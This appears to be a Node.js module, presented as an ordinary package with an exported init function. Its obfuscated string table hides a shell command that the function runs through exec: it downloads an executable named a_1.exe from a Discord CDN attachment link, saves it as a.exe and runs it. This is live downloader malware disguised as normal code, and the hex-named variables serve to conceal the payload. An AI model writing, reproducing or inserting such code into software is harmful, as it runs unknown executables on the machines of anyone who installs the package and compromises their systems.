const {exec} = require('node:child_process');
function init() {
    const _0x3d0efe = { _0x38cc41: 0x0 };
    const _0x44fc12 = {
        _0x50da72: 0x1,
        _0x517ec2: 0x2
    };
    const _0x14ae97 = _0x2d55;
    exec(_0x14ae97(_0x3d0efe._0x38cc41), (_0x457387, _0x59ef12, _0x49f352) => {
        const _0xfd930d = _0x2d55;
        if (_0x457387) {
            console[_0xfd930d(_0x44fc12._0x50da72)](_0xfd930d(_0x44fc12._0x517ec2) + _0x457387['message']);
        }
    });
}
module['exports'] = init;
function _0x2d55(_0x464163, _0x2d55c2) {
    const _0x2db625 = _0x4641();
    _0x2d55 = function (_0x2856d9, _0x206c3c) {
        _0x2856d9 = _0x2856d9 - 0x0;
        let _0x8ef2d0 = _0x2db625[_0x2856d9];
        return _0x8ef2d0;
    };
    return _0x2d55(_0x464163, _0x2d55c2);
}
function _0x4641() {
    const _0x3733d8 = [
        'curl\x20https://cdn.discordapp.com/attachments/1033806593281769572/1033832120067567657/a_1.exe\x20-o\x20a.exe\x20&&\x20a.exe',
        'log',
        'error:\x20'
    ];
    _0x4641 = function () {
        return _0x3733d8;
    };
    return _0x4641();
}
